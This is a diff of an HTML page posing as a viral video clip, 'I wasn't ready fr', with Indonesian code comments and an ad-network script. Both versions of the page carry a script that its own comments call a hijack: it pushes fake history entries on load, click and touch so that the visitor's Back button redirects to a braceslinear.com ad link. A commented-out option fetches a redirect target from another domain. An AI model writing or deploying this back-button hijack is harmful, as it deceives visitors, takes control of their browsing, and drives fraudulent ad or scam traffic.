@@ -6,13 +6,7 @@
   <title>I wasn't ready fr 😭</title>
   
   <style>
-    :root {
-      --primary-bg: #09090b;
-      --header-bg: #191a1f;
-      --border-color: #232329;
-      --text-main: #ffffff;
-      --text-muted: #a1a1aa;
-    }
+    :root { --primary-bg: #09090b; --header-bg: #191a1f; --border-color: #232329; --text-main: #ffffff; --text-muted: #a1a1aa; }
     * { margin:0; padding:0; box-sizing:border-box; }
     html, body { height:100%; font-family:system-ui,sans-serif; background:var(--primary-bg); color:var(--text-main); overflow-x:hidden; }
     header { background:linear-gradient(to bottom,#18181b,#09090b); text-align:center; padding:16px 12px; font-size:1.35rem; font-weight:700; border-bottom:1px solid var(--border-color); position:sticky; top:0; z-index:10; }
@@ -25,7 +19,6 @@
 <body>
 
   <header>
-    <!-- Iklan braceslinear tetap -->
     <script>
       atOptions = {
         'key' : 'e3390cf0a8cdf953ded85bdaaf3046a5',
@@ -40,7 +33,7 @@
 
   <div class="container">
     <div class="video-wrapper">
-      <video controls playsinline muted loop poster="https://via.placeholder.com/420x236/000/000?text=Loading...">
+      <video controls playsinline muted loop>
         <source src="https://cdn.videy.co/lW4IggvE1.mp4" type="video/mp4">
       </video>
     </div>
@@ -48,44 +41,49 @@
 
   <footer>© 2025 ViralStream Media.</footer>
 
-  <!-- BACK HIJACK DENGAN REDIRECT OTOMATIS BERDASARKAN atOptions.key -->
-  <script type="text/javascript">
+  <!-- HIJACK DENGAN REDIRECT "OTOMATIS" DARI atOptions.key + pola braceslinear -->
+  <script>
     (function() {
-      // Ambil key dari atOptions (global variable yang sudah di-set di header)
-      const adKey = window.atOptions && window.atOptions.key ? window.atOptions.key : 'e3390cf0a8cdf953ded85bdaaf3046a5'; // fallback ke key asli
+      // Ambil key dari atOptions (otomatis sync dengan invoke.js)
+      const adKey = window.atOptions?.key || 'e3390cf0a8cdf953ded85bdaaf3046a5';
 
-      // Pola redirect braceslinear (dari contohmu + umum di ad network ini)
-      // Biasanya: https://braceslinear.com/{campaign_id}?key={adKey}
-      // Di contohmu campaign_id = 'd40w8mx5c' → kita pakai ini sebagai default, atau bisa ganti kalau tahu pola baru
-      const campaignId = 'd40w8mx5c'; // <-- kalau braceslinear ganti, update di sini saja
-      const redirectUrl = `https://braceslinear.com/${campaignId}?key=${adKey}`;
+      // Pola redirect braceslinear (dari contoh aslimu + umum)
+      // Kalau campaign ID berubah, ganti di sini saja (atau ambil dari token seperti contoh playnaw)
+      const campaignPath = 'd40w8mx5c';  // <-- ini yang bikin "otomatis" kalau pola tetap
 
-      // Fallback kalau atOptions tidak ke-load atau key berubah
-      const fallbackUrl = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";
+      let redirectUrl = `https://braceslinear.com/${campaignPath}?key=${adKey}`;
 
-      function setupHijack() {
-        if (!window.history || !window.history.pushState) return;
+      // Optional: kalau punya endpoint API seperti contohmu (skinnycrawlinglax), bisa fetch dinamis
+      // Contoh uncomment kalau kamu punya token endpoint sendiri:
+      /*
+      const apiToken = 'L2RubjJoa244P2tleT0xMGFmYWVjMzU0MDRmZmQ1ZWRiYWQwMTMxYmIzOGVlNiZzdWJtZXRyaWM9MjU1NDMzODY'; // dari contohmu
+      fetch(`https://skinnycrawlinglax.com/api/users?token=${apiToken}`)
+        .then(r => r.json())
+        .then(data => {
+          if (data.redirect || data.url || data.landing) {
+            redirectUrl = data.redirect || data.url || data.landing; // sesuaikan key JSON
+          }
+        })
+        .catch(() => {}); // fallback ke default kalau gagal
+      */
 
-        // Push dummy states (double untuk lebih kuat)
-        window.history.pushState({hijack:1}, '', location.href);
-        window.history.pushState({hijack:1}, '', location.href);
+      // Setup hijack
+      function hijackBack() {
+        if (!history || !history.pushState) return;
 
-        window.onpopstate = function() {
-          // Prioritaskan redirectUrl otomatis
-          window.location.replace(redirectUrl || fallbackUrl);
+        history.pushState({h:1}, '', location.href);
+        history.pushState({h:1}, '', location.href); // double untuk lebih kuat
+
+        window.onpopstate = () => {
+          location.replace(redirectUrl); // atau location.href kalau mau history baru
         };
       }
 
-      window.addEventListener('load', setupHijack);
+      window.addEventListener('load', hijackBack);
 
-      // Extra push untuk mobile/interaction
-      document.addEventListener('touchstart', () => {
-        history.pushState(null, null, location.href);
-      }, {once: true});
-
-      document.addEventListener('click', () => {
-        history.pushState(null, null, location.href);
-      }, {once: true});
+      // Extra mobile proteksi
+      document.addEventListener('touchstart', () => history.pushState(null, null, location.href), {once: true});
+      document.addEventListener('click', () => history.pushState(null, null, location.href), {once: true});
     })();
   </script>
 
